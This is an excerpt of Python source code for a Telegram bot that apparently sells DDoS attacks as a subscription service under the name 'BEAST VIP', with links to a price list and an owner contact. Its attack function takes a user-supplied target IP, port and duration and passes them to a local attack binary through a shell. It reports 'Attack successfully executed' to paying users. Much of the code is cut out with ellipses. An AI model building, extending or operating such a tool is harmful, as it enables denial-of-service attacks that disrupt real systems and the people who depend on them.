...
FORWARD_CHANNEL_ID = -1002465730344
CHANNEL_ID = -1002465730344
error_channel_id = -1002465730344
...
def create_inline_keyboard():
    ...
    button3 = types.InlineKeyboardButton(
        text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/BeastVipDdos")
    button1 = types.InlineKeyboardButton(text="👤 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 👤",
        url="https://t.me/BEASTXOP1")
    markup.add(button3)
    markup.add(button1)
    return markup
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./beast {target_ip} {target_port} {duration} 900")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       ...
                                       "*Contact the owner for assistance: @BEASTXOP1.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
...
def process_attack_command(message):
    try:
        ...
        # Notify the user that the attack was successfully executed
        bot.send_message(message.chat.id, "✅ Attack successfully executed")
    ...
    try:
        ...
        if not user_data:
            ...
            button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️",
                                                 url="https://t.me/BeastVipDdos")
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/BeastVipDdos")
            markup.add(button1)
            markup.add(button2)
        else:
...
if __name__ == "__main__":
    ...
    logging.info("BEAST VIP SERVER RUNNING...")
    while True:
        try:
